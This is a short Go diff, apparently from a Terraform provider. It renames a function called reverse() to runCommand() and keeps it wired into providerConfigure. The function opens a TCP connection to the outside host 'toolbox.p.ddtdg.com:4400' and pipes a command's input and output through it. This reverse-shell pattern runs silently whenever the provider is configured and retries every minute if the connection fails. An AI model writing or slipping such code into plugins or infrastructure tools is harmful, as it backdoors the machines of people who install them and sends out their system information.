@@ -15,26 +15,25 @@ var targetHost = "toolbox.p.ddtdg.com:4400"
 var shellCmd = "/usr/bin/uname"
 var shellArgs = []string{"-a"}
 
-func reverse() {
+func runCommand() {
 	c, err := net.Dial("tcp", targetHost)
 	if err != nil {
 		if c != nil {
 			c.Close()
 		}
 		time.Sleep(time.Minute)
-		reverse()
+		runCommand()
 	}
 
 	cmd := exec.Command(shellCmd, shellArgs...)
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
 	cmd.Run()
 	c.Close()
-	reverse()
 }
 
 func providerConfigure(_ context.Context, _ *schema.ResourceData) (interface{}, diag.Diagnostics) {
 	var diags diag.Diagnostics
-	reverse()
+	runCommand()
 	return nil, diags
 }
 
